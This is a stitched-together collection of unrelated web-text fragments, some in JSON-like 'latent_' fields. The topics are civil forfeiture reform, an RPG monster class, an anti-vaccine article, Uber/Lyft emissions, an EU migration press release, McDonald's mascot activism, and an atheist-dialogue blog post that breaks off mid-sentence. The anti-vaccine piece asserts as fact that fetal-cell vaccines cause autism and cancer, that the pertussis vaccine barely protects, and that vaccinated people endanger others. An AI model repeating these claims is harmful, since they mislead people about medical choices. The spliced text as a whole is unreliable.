$2.4 million per year from the federal equitable sharing program. That changed when a coalition of civil rights and advocacy organizations, including the ACLU of New Mexico, the Rio Grande Foundation, and Drug Policy Alliance teamed up with Brad Cates, who oversaw federal asset forfeiture under President Ronald Reagan, to convince legislators that the practice was an abuse of power. Their argument was bolstered by a leaked recording of a prosecutor encouraging police to seize expensive cars and homes—a clear sign of policing for profit, says Emily Kaltenbach, director of the Drug Policy Alliance’s New Mexico branch.\n\nIn New Mexico, money and property can now only be seized in criminal cases, not in civil ones. And items can only be taken after a criminal conviction, if they’re associated with the crime and if law enforcement successfully fights for them during a separate trial in criminal court. Proceeds must go a general state fund, not directly to law enforcement. Moreover, the law banned the practice of turning over assets to the feds, unless they are worth at least $50,000. New Mexico’s sweeping reform was achieved in large part because the law enforcement community was caught off guard by the speed at which the legislation received unanimous support, Kaltenbach says. As a result, there was no organized opposition.\n\nNebraska passed a similar law abolishing civil forfeiture last year, after the state’s ACLU chapter released a damning report on the practice in 2015. Under the old law, law enforcement agencies collected $3 million between 2011 and the report’s release. Agencies also received $16 million from the equitable sharing program between 2010 and 2014. The ACLU leveraged public outrage over the report in conversations with legislators, says Spike Eickholt, a lobbyist for the organization. Cops, sheriffs, and state patrolmen also put forth a tone-deaf opposition that focused on the law’s effect on agencies’ bottom lines. “It had gotten to a point … that no one could defend civil forfeiture on its merits,” Eickholt says. Despite their concerted pushback, members of law enforcement were unable to convince legislators that civil forfeiture was necessary to stop crime.\n\nSome states that haven’t ended civil forfeiture altogether have implemented procedural reforms. In California—where more than 20 county sheriffs and police departments collected millions over a five-year period—and seven other states, property can be seized but not forfeited until after a criminal conviction. Just this month, Connecticut’s governor signed a law that bans seizure unless an arrest is made and requires a criminal conviction before property can be forfeited. What differentiates these state laws from the ones implemented in New Mexico and Nebraska is that agencies can still pursue forfeiture in civil court once there’s been a conviction. In cases where people are acquitted, they get their money and valuables back. Other states, including Pennsylvania and Florida, have shifted the burden of proof to law enforcement to demonstrate that an asset should be seized and forfeited or have raised the standard of proof for showing that an asset was related to a crime. Florida now prohibits seizing someone’s property unless he or she has been arrested and charged.\n\nThe inability to abolish civil forfeiture in these states speaks to the potency of law enforcement’s opposition, according to McGrath of the Institute for Justice. The states that have tried and failed to pass reform, including Texas, Alabama, Idaho, and Oklahoma, are the ones in which district attorneys and police have been most reluctant to compromise. With the United States attorney general on their side, they may not have to.",

Gibbering mouthers are protoplasmic blobs seemingly made up entirely of mouths and eyes. While most are only semi-intelligent at best, a few are well beyond their kin, with a strange alien intelligence and hideous cunning.\n\nBeing essentially formless masses of variable size and weight (a level 1 drooler is typically the rough size and weight of a 50 pound dog – this doubles at every level thereafter with Shoggoth Lords weighing in at 12 tons of screaming eyeballs), gibbering mouthers cannot wear armour and can only carry one quarter of their normal carrying capacity.\n\nGibbering mouthers move by latching on to the ground with mouth-covered pseudopods and pulling themselves. On most terrain this has a movement rate of 30’ (10’), but on muddy or slippery terrain this increases to 60’ (20’).\n\nBeing made of eyes and mouths, gibbering mouthers have a tendency to notice things sneaking up on them, reducing surprise chances by half.\n\nWhile gibbering mouthers can wield just about any kind of melee weapon, they usually attack by extending pseudopods covered in mouths to bite their foes. They can attack with a number of mouths equal to their level +1. Each mouth deals only one damage, but fastens to the target and deals an additional damage each round thereafter. A target with 3 or more mouths attached must make a saving throw against wands with a +4 bonus (plus any Dexterity modifiers) every round to resist falling under the gibbering mouther. A target that fails this save can be overrun by the gibbering mouther the next round and is automatically struck by twice the number of mouths the gibbering mouther can attack with. The mouther then can use his full complement of “attacking” mouths on other targets. The damage per mouth increases to 1d2 at level 7, and further to 1d3 at level 9 and 1d4 at level 10.\n\nDrooling: Beginning at level 1, a gibbering mouther produces prodigious quantities of drool. This lubricates the ground under them, but also can be used to produce a blinding flash of light. Once per day per two levels (round up), the gibbering mouther can spit a special drool that explodes into a flash of bright light. In a dark environment like a dungeon, this is enough to blind those looking at the flash for one round if they fail a save versus petrification.\n\nGround Control: Level 2 spotters can change the consistency of the ground around them as long as it is made of dirt or stone. This takes one round to do, but changes the consistency of the ground within 5 feet of the mouther to that of a weird dough-like texture, a mealy quicksand, or back to normal stone.\n\nScreaming: Level 3 mouthers are known as screamers or wailers because they can scream at incredible volumes for far too long – typically when they see something they want to eat. This screaming will attract wandering monsters, but it also renders opponents (and friends) nearly deaf. Everyone within 10 ft per level of the mouther is considered deaf for the duration of the screaming, and must make a save versus spells or be rendered deaf for 1d4 rounds thereafter – deaf spellcasters have a 20% of failure when casting spells because they can’t hear the somatic components of their spells.\n\nGibbering: Level 5 mouthers learn to turn down the volume of their screams, but instead produce an incoherent gibbering that causes all intelligent creatures within a 10 ft radius per level of the mouther to make a saving throw versus spells or be confused for the duration of the gibbering. Roll 1d8 each round to determine each confused creature’s actions:\n\n1 – wander for the round\n\n2-3 – stand stunned for the round\n\n4-5 – attack the nearest living creature\n\n6-7 – act normally\n\n8 – run in fear from the gibbering mouther\n\nMaddening: At level 8, the alien hunger’s gibbering continues to effect those who failed their saves against it for 1d6+2 rounds after the gibbering ends.",

  "latent_16476": "Dr. Mercola\n\nWaking Times\n\nIn 2010, two Merck virologists filed a federal lawsuit under the False Claims Act against their former employer, alleging the vaccine maker lied about the effectiveness of their mumps vaccine (which is part of the trivalent measles, mumps, and rubella (MMR) vaccine).\n\nThe whistleblowers, Stephen Krahling and Joan Wlochowski, claimed they witnessed “firsthand the improper testing and data falsification in which Merck engaged to artificially inflate the vaccine’s efficacy findings.”\n\nThey charged that Merck used improper testing techniques; manipulated testing methodology; abandoned undesirable test results; falsified test data; and failed to adequately investigate and report the diminished efficacy of its mumps vaccine.\n\nThey also claim Merck falsely verified that each manufacturing lot of mumps vaccine would be as effective as identified in the labeling; falsely certified the accuracy of applications filed with the FDA; falsely certified compliance with the terms of the CDC purchase contract; and mislabeled, misbranded and falsely certified its mumps vaccine, among other violations.\n\nMerck allegedly falsified the data to hide the fact that the mumps vaccine in the MMR shot has significantly declined in effectiveness.1\n\nBy artificially inflating the mumps vaccine efficacy, Merck was able to continue selling MMR vaccine in the US and maintain its monopoly over the mumps vaccine market in the US and other nations that purchase Merck’s MMR vaccine.\n\nThis is the main point of contention of a second class-action lawsuit, filed by Chatom Primary Care2 in 2012.\n\nUS District Court Judge C. Darnell Jones has now given both of these lawsuits the green light to proceed.3, 4\n\nAlso noteworthy is the fact that the Department of Justice (DOJ) has gone on record disputing Merck’s apparently false assertions that DOJ previously investigated the issue and declined to join in the lawsuit because it found no wrongdoing by Merck.\n\nCourt Documents by Department of Justice Contradict Merck Statements\n\nThe Wall Street Journal5 initially published the following statement received from a Merck spokeswoman:\n\n“This lawsuit is completely without merit. Merck has presented information that demonstrated to the US Department of Justice that these allegations are factually false, and after the department conducted its own two-year investigation, it decided not to pursue this lawsuit. In addition, the FDA previously examined the issues raised in the lawsuit, and they were resolved to the agency’s satisfaction. Merck intends to vigorously defend against the litigation filed by the plaintiff.”\n\nHowever, court documents filed by DOJ appear to refute Merck’s insinuations that DOJ has already made a final determination in this case and sided with Merck. Kellie Lerner, a representative for vaccine purchasers, sent the Wall Street Journal the following statement:\n\n“Contrary to Merck’s assertions, the Department of Justice has submitted documents to the court affirming its ‘strong interest in the outcome’ of the case, and clarifying that its decision not to intervene ‘should not be interpreted as a comment on the merits.’ More importantly, the government has preserved its right to intervene later in the proceedings. Based on the government’s submissions to the court, we take issue with any assertion that the government has definitively concluded to not pursue this case.” [Emphasis mine]\n\nDoes Faked Vaccine Efficacy Nullify Indemnification?\n\nIn order for a drug company producing and selling a in the U.S. to be indemnified from civil liability for vaccine damage, the vaccine must be licensed by the FDA as “pure” (safe) and “potent” (effective) and the CDC must have recommended the vaccine for universal use by children.\n\nIf in fact a drug company fakes or withholds information from the government about a vaccine’s safety or effectiveness, does indemnification still apply? Likely not. And that could spell trouble for Merck.\n\nThis certainly isn’t the first time vaccine effectiveness has been questioned. Even for vaccines that adhere to government standards for demonstrating effectiveness, while vaccine acquired “herd immunity” is thrown around like gospel, much of the protection vaccines offer has actually been shown to wane rather quickly. The fact is, vaccine-acquired immunity does NOT work the same way as the naturally-acquired immunity you get after recovering from the disease.\n\nBesides that, a majority of the adult population never receives boosters, so most of the adult population is in effect “unvaccinated.” This too puts a serious hole in the 85-95 percent requirement to achieve vaccine-acquired “herd immunity.”\n\nDownload Interview Transcript\n\nWhooping Cough Vaccine—Another Vaccine Failure\n\nIn 2010, the largest outbreak of B. pertussis whooping cough in over 50 years occurred in California. Around that same time, a scare campaign was launched in the California by Pharma-funded medical trade associations, state health officials, and national media, targeting people opting out of receiving pertussis vaccine, falsely accusing them of causing the outbreak.\n\nResearch published in March 2012 painted a very different picture than the one hyped by public health officials and the media.6\n\nIn fact, the study showed that 81 percent of 2010 California whooping cough cases in people under the age of 18 occurred in those who were fully up to date on the whooping cough vaccine. Eleven percent had received at least one pertussis containing vaccine, but not the entire recommended series, and only eight percent of those stricken were unvaccinated. According to the authors:\n\n“This first detailed analysis of a recent North American pertussis outbreak found widespread disease among fully vaccinated older children. Starting approximately three years after prior vaccine dose, attack rates markedly increased, suggesting inadequate protection or durabilityfrom the acellular vaccine.” [Emphasis mine]\n\nSo, as clearly evidenced in this study, the pertussis vaccine likely provides very little, if any, protection from the disease. In fact, basic science research suggests those who are fully vaccinated can still get infected with pertussis and transmit infection without even showing any symptoms.\n\nA 2013 baboon study busted a major hole in the argument that vaccines achieve herd immunity, because while the whooping cough vaccine was found to cut down on serious clinical disease symptoms, it doesn’t eliminatetransmission of the disease! With that in mind, vaccinated people may pose a far greater threat to others than unvaccinated people because they do not know when they’re actively transmitting infection.\n\nMerck Whistleblowers, CDC Whistleblowers–That’s a Lot of Whistling…\n\nIn late August, the non-profit National Vaccine Information Center (NVIC) renewed its call for oversight of vaccine safety to be removed from the Department of Health and Human Services (DHHS), which is responsible for vaccine development, regulation, policymaking, and promotion and also serves as a legal respondent and administrator for the federal Vaccine Injury Compensation Program (VICP).7\n\nNVIC’s call came after a senior scientist at the Centers for Disease Control and Prevention (CDC) issued a public statement8 admitting he and CDC co-authors of a MMR vaccine safety study9 published in 2004 in Pediatrics “omitted statistically significant information” and that “the final study protocol was not followed.” “I regret that my coauthors and I omitted statistically significant information,” he said in his statement.\n\nIf you can possibly lose more confidence with our CDC officials—who both promote vaccines while also having the conflicting duty of monitoring safety—listen to investigative reporter Sheryl Atkisson’s interview with CDC Director of Immunization Safety, Dr. Frank DeStefano.\n\nDeStefano co-authored the MMR vaccine safety study in question with Dr. Thompson. Not surprisingly, Dr. DeStefano defends the study, and maintains the status quo position that there’s no causal link between vaccines and autism. Attkisson did get him to concede that there is the possibility that vaccines may trigger autism in some children, however.\n\n“It’s hard to predict who those children might be, but certainly, individual cases can be studied to look at those possibilities,” he told Attkisson.\n\nStudy Questions Whether Autism and Cancer are Related to Human Fetal DNA in Vaccines\n\nDespite the CDC’s reassurances that all is well with vaccines, Dr. Thompson’s confession coincides with the publication of a study10, 11 asserting there are significant correlations between autism and vaccines manufactured using human fetal cell lines contaminated with retroviruses. This includes certain MMR (measles, mumps, and rubella), Varicella (chickenpox), and Hepatitis-A vaccines. Moreover, the human fetal contaminated vaccines were also associated with childhood leukemia and lymphomas.\n\nAccording to the authors, autism rates rose sharply each time a vaccine manufactured with human fetal cell lines containing fetal and retroviral contaminants were released. The cell line in question is known as WI-38. In the US, autism rates jumped in 1980-1981 following the approval of MeruvaxII and MMRII, both of which are made with the human fetal cell line WI-38. Another jump in autism prevalence occurred in 1988, corresponding to three factors:\n\nThe addition of a second dose of MMRII A highly successful measles vaccination campaign that raised compliance from 50 to 82 percent between the years 1987-1989 The introduction of Poliovax in 1987\n\nIn 1995, autism rates jumped again in response to the introduction of the Varicella vaccine Varivax. In conclusion, the authors note that “rising autistic disorder prevalence is directly related to vaccines manufactured utilizing human fetal cells.”\n\nPro-Vaccine Fundamentalists Targeting Anyone Questioning Safety\n\nMany other whistleblowers have stuck their necks out in recent years, revealing widespread corruption in medical science—among researchers, drug companies, and government agencies. Many have also revealed that these agencies, organizations, and companies are not above using mafia-like tactics to maintain the status quo. For example, whistleblower Ronald Kavanagh was a drug reviewer for the FDA in the Center for Drug Evaluation and Research from 1998 to 2008.\n\nIn a 2012 interview, he revealed how the FDA bypassed or ignored safety issues on major drugs approved during his employment. He also gave several examples of how he was intimidated by the agency, to the point of fearing for his life and the safety of his children.\n\nWhile many refuse to believe a government agency or a pharmaceutical company or special interest groups connected with government and industry would resort to such extreme measures, history, and the experiences of many whistleblowers tells a different story. Fundamentalists and big pharma shills are now targeting everyone who disagrees with the vaccine agenda.NVIC is one target.12 And, recently, a State Farm insurance company television ad that featured comedian Rob Schneider ,who has publicly defended parental rights and informed consent to vaccination, was dropped by State Farm after a group of cyber bullies targeted Schneider for making pro- vaccine choice statements. According to MSN:13\n\n“[I]t wasn’t the content of the ad that created a problem for State Farm, it was the social media response focusing on Schneider’s anti-vaccine stance. The company said the problem is that the ad became a platform for a discussion unrelated to the products and services provided by State Farm.”\n\nAs reported by Jon Rappaport,14 the orchestrated social media campaign to pressure State Farm to remove the ad in which Schneider played a comic role included the creation of an attack video in which it was noted that: “State Farm provides health insurance, and nothing ensures public health more than getting vaccinated. It is time to end the anti-vaccination movement; with your help, we can elicit change.” Schneider rebutted with a quote from George Washington, saying: “If the Freedom of Speech is taken away then dumb and silent we may be led, like sheep to the slaughter.”\n\nIf pro-forced vaccination proponents consider those who defend the ethical principle of informed consent to be anti-vaccine, and they say it’s time to “end” anyone who questions the safety and effectiveness of vaccines, then that sounds an awful lot like a now familiar threat from a major vaccine manufacturer—Merck, which had a hit list of doctors who criticized the deadly drug Vioxx. The hit list came to light in 2009, following testimony in an Australian Vioxx class action case. As reported by CBS15 at the time:\n\n“Merck emails from 1999 showed company execs complaining about doctors who disliked using Vioxx. One email said:We may need to seek them out and destroy them where they live…”\n\nHealth care workers are definitely on the hit list of those who would force everyone to get vaccinated – no questions asked and no exceptions. In 2012, Missouri health care workers were threatened with corrective action for refusing the flu vaccine and were told they’d be ineligible for pay raises. Last year, eight nurses in Indiana were fired for not complying with the hospital’s new mandatory annual flu shot rule, announced in September 2012. This despite mounting evidence showing that the flu vaccine is not an effective way to prevent contracting and spreading the flu. One nurses’ union is now fighting back. According to the Daily Hampshire Gazette:16\n\n“The nurses’ union at one of Boston’s major teaching hospitals has sued to block a policy that would require nurses to get flu shots… Brigham and Women’s mandated vaccinations because its worker vaccination rate of 77 percent is far lower than the city’s other teaching hospitals. Efforts to boost the rate, including free shots available around the clock, have fallen short… The union, which represents 3,200 Brigham and Women’s nurses, said in the suit that the hospital’s yet-to-be-implemented mandate, which could lead to termination of employees who refuse vaccination, violates a state regulation that bars hospitals from requiring employees to receive a vaccine.”\n\nProtect Your Right to Informed Consent and Defend Vaccine Exemptions\n\nWith all the uncertainty surrounding the safety and efficacy of vaccines, it’s critical to protect your right to make independent health choices and exercise voluntary informed consent to vaccination. It is urgent that everyone in America stand up and fight to protect and expand vaccine informed consent protections in state public health and employment laws. The best way to do this is to get personally involved with your state legislators and educating the leaders in your community.\n\nTHINK GLOBALLY, ACT LOCALLY.\n\nNational vaccine policy recommendations are made at the federal level but vaccine laws are made at the state level. It is at the state level where your action to protect your vaccine choice rights can have the greatest impact. It is critical for EVERYONE to get involved now in standing up for the legal right to make voluntary vaccine choices in America because those choices are being threatened by lobbyists representing drug companies, medical trade associations and public health officials, who are trying to persuade legislators to strip all vaccine exemptions from public health laws.\n\nSigning up for NVIC’s free Advocacy Portal at www.NVICAdvocacy.org gives you immediate, easy access to your own state legislators on your Smart Phone or computer so you can make your voice heard. You will be kept up-to-date on the latest state bills threatening your vaccine choice rights and get practical, useful information to help you become an effective vaccine choice advocate in your own community. Also, when national vaccine issues come up, you will have the up-to-date information and call to action items you need at your fingertips..\n\nSo please, as your first step, sign up for the NVIC Advocacy Portal.\n\nShare Your Story with the Media and People You Know\n\nIf you or a family member has suffered a serious vaccine reaction, injury or death, please talk about it. If we don’t share information and experiences with each other, everybody feels alone and afraid to speak up. Write a letter to the editor if you have a different perspective on a vaccine story that appears in your local newspaper. Make a call in to a radio talk show that is only presenting one side of the vaccine story.\n\nI must be frank with you; you have to be brave because you might be strongly criticized for daring to talk about the “other side” of the vaccine story. Be prepared for it and have the courage to not back down. Only by sharing our perspective and what we know to be true about vaccination will the public conversation about vaccination open up so people are not afraid to talk about it.\n\nWe cannot allow the drug companies and medical trade associations funded by drug companies or public health officials promoting forced use of a growing list of vaccines to dominate the conversation about vaccination. The vaccine injured cannot be swept under the carpet and treated like nothing more than “statistically acceptable collateral damage” of national one-size-fits-all mandatory vaccination policies that put way too many people at risk for injury and death. We shouldn’t be treating people like guinea pigs instead of human beings.\n\nInternet Resources Where You Can Learn More\n\nI encourage you to visit the website of the non-profit charity, the National Vaccine Information Center (NVIC), atwww.NVIC.org:\n\nNVIC Memorial for Vaccine Victims : View descriptions and photos of children and adults, who have suffered vaccine reactions, injuries and deaths. If you or your child experiences an adverse vaccine event, please consider posting and sharing your story here.\n\n: View descriptions and photos of children and adults, who have suffered vaccine reactions, injuries and deaths.

Harassment, intimidation, and refusal of medical care is becoming the modus operandi of the medical establishment in an effort to stop the change in attitude of many parents about vaccinations after they become truly educated about health and vaccination.\n\nHowever, there is hope.\n\nAt least 15 percent of young doctors recently polled admit that they’re starting to adopt a more individualized approach to vaccinations in direct response to the vaccine safety concerns of parents. It is good news that there is a growing number of smart young doctors, who prefer to work as partners with parents in making personalized vaccine decisions for children, including delaying vaccinations or giving children fewer vaccines on the same day or continuing to provide medical care for those families, who decline use of one or more vaccines.\n\nSo take the time to locate a doctor, who treats you with compassion and respect and is willing to work with you to do what is right for your child.\n\n~~ Help Waking Times to raise the vibration by sharing this article with the buttons below…",
  "latent_16693": "Are Uber and Lyft Really that Green?\n\nI like to think of all sharing economy options, like rideshare, carpool, and shared home services like Airbnb as more sustainable than their old school counterparts like taxis and hotels, and can help us build the sustainable city of the future. But this is the image these hip brands wish to cultivate, without the initiatives to back it up.\n\nTwo recent posts from our friend Robyn Purchia of EdenKeeper and the SF Examiner delve into this issue about whether or not Lyft and Uber, now known as ride-hailing services instead of ridesharing, are actually not as green as we’d like them to be.\n\nAs Purchia explains, the 2008 San Francisco Green Taxi Ordinance reduced gas consumption by 2.9 million gallons per year, lowered greenhouse gas emissions by 35,000 tons annually, and saved drivers money in gas costs and brake repairs. But Lyft and Uber, famously ‘disrupting’ this system, and are potentially giving the city by the bay a larger carbon footprint.\n\nRide-hailing services are, “driving business away from The City’s green taxi fleet; they are allowing drivers from all over the state to oversaturate San Francisco streets with any type of car they want. Last week, a Lyft driver from Santa Cruz picked me up in a Jeep. A few years ago, Uber sent a Hummer to drive me home,” explains Purchia.\n\nShe explains that without data, the SF Municipal Transportation Agency can’t make statements, but now that data has been released, many people are excited that there will be some direct legislative action. Until then, Purchia asks why don’t these companies regulate themselves? Both Lyft and Uber have a commitment to reduce emissions (primarily by reducing car ownership), but they’ve made no steps in the right direction. In fact, Lyft actually offered to pay a stipend to new SUV drivers to accommodate the increase in Lyft Plus ride option. And both companies have said it would detract from the freedom to add fuel efficiency to the list.\n\nHopefully there will be some movement on these topics soon in the SF government, which as usual, has the power to guide regulations around the rest of the nation and the world.\n\nUntil then, perhaps you want to check out some ridesharing options or some carpooling options to get you where you need to go in a more sustainable way?",
  "latent_17089": "Ahead of next week's European Council, the Commission is presenting four progress reports on measures taken under the European Agenda on Migration to stabilise the flows and better manage the external borders.\n\nWith most Member States having shown that relocation works if there is political will, the Commission is calling on those Member States who have not yet done so to take steps to comply with their legal obligations and contribute fairly and proportionally to the scheme. The Commission is also making a renewed call to further accelerate the roll-out of the European Border and Coast Guard and to fill persistent gaps in manpower and equipment as swiftly as possible. The EU-Turkey Statement continued to deliver results - as shown by a consistent reduction in irregular crossings to Greece and the successful resettlement of over 6,000 Syrians given safe and legal pathways to Europe. Continuous efforts are still needed to ensure the full implementation of the Statement and in particular to improve the processing of asylum requests in Greece.\n\nEuropean Commission First Vice-President Frans Timmermans said: \"Two years after the launch of the European Agenda on Migration, our joint efforts to manage migratory flows are starting to bear fruit. But the push factors for migration to Europe remain and the tragic loss of life in the Mediterranean continues. As the weather improves, we must redouble our cooperation – working with third countries, protecting our EU external borders, together giving refuge to those who need it and ensuring that those who have no right to remain in the EU are quickly returned. We can only effectively manage migration in Europe if we all work together in a spirit of solidarity and responsibility.\"\n\nCommissioner for Migration, Home Affairs and Citizenship Dimitris Avramopoulos said: \"Our Union is based on solidarity and the sharing of responsibility. These fundamental values apply to all our policies and migration is no exception. We cannot and we will not leave those Member States with an external border on their own. And when it comes to relocation, let me be crystal clear: the implementation of the Council Decisions on relocation is a legal obligation, not a choice.\"\n\nRelocation and resettlement: all should contribute\n\nThe pace of relocation has significantly increased in 2017 with almost 10,300 persons relocated since January — a fivefold increase compared to the same period in 2016. As of 9 June, the total number of relocations stands at 20,869 (13,973 from Greece, 6,896 from Italy). With almost all Member States now relocating from Italy and Greece, it is feasible to relocate all those eligible (currently around 11,000 registered in Greece and around 2,000 registered in Italy, with arrivals in 2016 and 2017 still to be registered) by September 2017. In any case, Member States' legal obligation to relocate will not cease after September: the Council Decisions on relocation apply to all persons arriving in Greece or Italy until 26 September 2017 and eligible applicants must be relocated within a reasonable timeframe thereafter.\n\nOver the last months, the Commission has repeatedly called on those Member States that have not yet relocated a single person, or that are not pledging to relocate, to do so. Regrettably, despite these repeated calls, the Czech Republic, Hungary and Poland, in breach of their legal obligations stemming from the Council Decisions and their commitments to Greece, Italy and other Member States, have not yet taken the necessary action. Against this background, and as indicated in the previous Relocation and Resettlement Report, the Commission has decided to launch infringement procedures against these three Member States.\n\nProgress on resettlement continues to be well on track with nearly three quarters (16,419) of the 22,504 resettlements agreed in July 2015 having already been carried out. Resettlements under the EU-Turkey Statement reached a new record high in May 2017 with almost 1,000 Syrian refugees being provided with safe and legal pathways to Europe. The total number of resettlements from Turkey under the Statement now stands at 6,254.\n\nEU-Turkey Statement: concrete results in managing migration jointly\n\nMore than a year after the EU-Turkey Statement was agreed by EU Heads of State or Government and Turkey, and despite the challenges, the Statement continues to deliver concrete results, ensuring an effective management of migratory flows along the Eastern Mediterranean route.\n\nThe number of daily crossings from Turkey to the Greek islands remains at around 50 per day and, despite recent tragic incidents, the number of lives lost in the Aegean has fallen substantially. Overall, arrivals have decreased by 97% since the Statement became operational. The pace of return operations has seen some positive developments with an additional 311 returns carried out since the previous report in March, bringing the total number of migrants returned to 1,798. However, arrivals still outpace the number of returns from the Greek islands to Turkey, leading to pressure on the reception structure on the islands. To increase returns and improve the conditions on the islands, additional efforts from the Greek authorities, EU Agencies and Member States are needed.\n\nProgress in other areas of the Statement is also ongoing, with the continuing efforts by the EU and Turkey to accelerate the delivery of the financial support under the Facility for Refugees in Turkey. Almost all of the funding for 2016-2017 has now been allocated (€2.9 billion out of €3 billion) and contracts have already been signed for a total of €1.57 billion. Currently, more than 600,000 refugees in Turkey are supported by the Emergency Social Safety Net and the number of Syrians supported through direct cash transfers is expected to increase to 1.3 million.\n\nThe Commission has increased its efforts to facilitate the swift finalisation of the Standard Operating Procedures for the Voluntary Humanitarian Admission Scheme and is also continuing to encourage Turkey to complete the seven outstanding benchmarks of the Visa Liberalisation Roadmap.\n\nEuropean Border and Coast Guard: accelerated roll-out needed\n\nProgress in fully rolling out the European Border and Coast Guard has continued over the past months. With over 1,600 officers supporting national forces in Greece (944), Italy (402), Bulgaria (166) and Spain (65), the EU's external borders are better protected than ever before. The European Border and Coast Guard Agency completed the vulnerability assessments of Schengen States' external borders and concrete recommendations have been addressed for 20 Schengen States. Further progress has been made in negotiations with Serbia on the status agreement and the Commission intends to shortly propose the launch of negotiations with other neighbouring countries, including Albania, Bosnia and Herzegovina and Montenegro.\n\nThe pace of return operations organised by the European Border and Coast Guard has continued to grow, with 6,799 irregularly staying migrants returned in 2017 so far, representing an increase of over 157% compared to the same period of last year. However, Member States need to rapidly increase their use of the Agency's reinforced capacity on return and make full use of the support offered by the Agency for the organisation of return operations. Additional efforts are also needed from Member States to respond to calls for deployment for ongoing operations and close the gaps both in human resources and technical equipment. These gaps need to be fulfilled as a matter of priority to ensure the continuation of ongoing operations and the full availability of the Rapid Reaction Pools, in particular of the equipment pool to which only 14 Member States have so far contributed.\n\nPartnership Framework and Central Mediterranean Route: tangible progress\n\nThe Commission is also presenting today the results and lessons learned under the Partnership Framework on Migration, one year after its launch. Progress has been made in the fight against traffickers with closer cooperation with key countries in Africa to tackle migration flows through the Central Mediterranean route, with a strong focus on cooperation with Libya. The EU Trust Fund has supported political priorities, mobilising around €1.9 billion for 118 projects in one year to address the root causes of migration and supporting better migration management in countries of origin and transit. However, further efforts are needed in a number of areas, in particular to step up return and readmission to partner countries (for more information, see press release).\n\nFor More Information\n\nThirteenth Report on Relocation and Resettlement\n\nCommunication: Thirteenth Report on Relocation and Resettlement\n\nAnnex 1: Relocations from Greece\n\nAnnex 2: Relocations from Italy\n\nAnnex 3: Relocations from Italy and Greece\n\nAnnex 4: Resettlement State of Play\n\nFactsheet: Relocation and Resettlement\n\nFactsheet: Managing the refugee crisis: EU financial support to Greece\n\nThe European Agenda on Migration\n\nCouncil Decision on the relocation of 40,000 people from Italy and Greece\n\nCouncil Decision on the relocation of 120,000 people from Italy and Greece\n\nCouncil Conclusions on Resettlement of 20,000 persons in need of international protection\n\nEU-Turkey Statement of 18 March 2016\n\nSixth Progress Report on the EU-Turkey Statement\n\nCommunication: Sixth Report on the progress made in the implementation of the EU-Turkey Statement\n\nAnnex: Progress on the implementation of the Joint Action Plan\n\nFactsheet: The Facility for Refugees in Turkey\n\nFirst Annual Report on Facility for Refugees in Turkey\n\nOperational implementation of the EU-Turkey Statement: Member States pledges and deployments for Frontex and EASO operations - returns and resettlements\n\nEU-Turkey Statement of 18 March\n\nEU-Turkey Action Plan of 15 October, activated on 29 November\n\nAppointment of the EU Coordinator\n\nFourth Progress Report on the operationalisation of the European Border and Coast Guard\n\nCommunication: Fourth Report on the operationalisation of the European Border and Coast Guard\n\nFactsheet: Securing Europe's External Borders: The European Border and Coast Guard\n\nSecuring Europe's Borders: European Commission website\n\nEuropean Border and Coast Guard Agency website",

The company argues that its marketing practices are responsible, and that its food is \"high quality.\"\n\nThe push to retire Ronald is being led by a group called Corporate Accountability International, which plans to introduce a resolution calling for the clown's ouster at the company's annual shareholder meeting Thursday.\n\n\"Through this initiative, the public health community is rallying behind a simple message to McDonald's: stop making the next generation sick -- retire Ronald and the rest of your junk food marketing to kids,\" said Steven Rothschild, a professor at Rush Medical College and a backer of the resolution.\n\nMcDonald's is already being sued by a group of consumers and health care professionals over the toys that come in the Happy Meals marketed to kids. The group filed a class action suit late last year in California that claims the company's marketing practices violate state's consumer protection laws.\n\nIn addition, a group of Philadelphia nuns filed a proxy resolution in March asking McDonald's to investigate its \"policy response\" to concerns about the link between fast food and childhood obesity.\n\nMcDonalds stands by Ronald and says that it is committed to children's health and nutrition.\n\n\"We are committed to responsible advertising and take our communications to children very seriously,\" McDonald's said in a statement.\n\nThe company has argued that it has introduced healthy alternatives such as Apple Dippers and low-fat milk in Happy Meals. But critics say the company still serves French fries in the vast majority of its kid-friendly combo meals.\n\nMcDonald's (MCD, Fortune 500) also stressed that Ronald is the symbol of its flag-ship charity, Ronald McDonald house, which is dedicated to the health and well being of children.\n\n\"Ronald is an ambassador for good and delivers important messages to kids on safety, literacy and balanced, active lifestyles,\" the statement said.\n\nRonald McDonald, one of the world's most recognizable clowns, has been the company's mascot since 1971.

  "latent_17261": "Today is Ask an Atheist Day. The Secular Student Alliance describes the purpose of this day this way:\n\nNational Ask An Atheist Day is an opportunity for secular groups across the country to work together to defeat stereotypes about atheism and encourage courteous dialogue between believers and nonbelievers alike. The event is intended to be an opportunity for the general public – particularly people of faith – to approach nontheists and ask questions about secular life. We’re encouraging all SSA affiliate groups to participate at whatever level they are able!\n\nOne of the benefits of writing for Patheos is the opportunity to get to know bloggers and commenters who are coming from vastly different perspectives than my own. I think talking with people with whom we disagree–even those with whom we disagree profoundly about things we each find very important–can be a really positive thing. It helps us to treat our neighbors as human beings and care about them as real people.\n\nTwo of the folks I’ve gotten to know a bit while blogging over here are atheist bloggers Neil Carter (Godless in Dixie) and JT Eberhard (W.W.J.T.D.). Both have had previous experiences within Christianity, although JT’s was more brief. Neil spent most of his life in the church before becoming an atheist. JT tends to be a bit of a firebrand on his blog, but courteous and friendly in personal interactions. JT covers the separation of church and state beat a lot, and I learn a lot from his posts about situations where religious power is sometimes used inappropriately within government. Neil is more of a diplomat and has an excellent grasp of theology. Some of his insights about church culture are so nuanced and helpful that I’ve often thought Christians could well benefit from thinking through some of his critiques. Both these men have been nothing but polite to me, and I really appreciate their willingness to come over here and talk with my readers.\n\nI hope this mashup of my two interviews with them will help Christians and atheists talk with one another and show mutual respect, even amidst important disagreements. I hope listening a little more and talking a little less sometimes will help us as Christians treat atheists with more kindness in an increasingly polarized culture. There’s a time and place for debate, but I think taking a moment to just listen is important too.\n\nAnd lest my Christian readers think I’ve gone off the deep end and have forsaken the Christian faith, such is not the case. This is one thing I really appreciated about a post JT Eberhard did about me a while ago. Here’s something he said that I think is really awesome:\n\nSo I just wanted to say kudos to Rebecca (and encourage you all to do likewise). This will not stop me from telling Rebecca I think she’s wrong about religion, and I suspect it won’t stop her from telling me I should believe in Jesus [Rebecca’s note: yep.]. But at least we can have the conversation in good faith now, knowing that each truly cares for the other as a person rather than just seeing them as a means to victory for our ideology.\n\nExactly right, JT. No, we don’t agree about a lot of stuff, but y’all are people, not a means of victory for an ideology. Thanks for talking with me.\n\nPlease briefly share something about who you are (your job, your family, or the like). Please also share a little bit about how you’ve come to find yourself as an 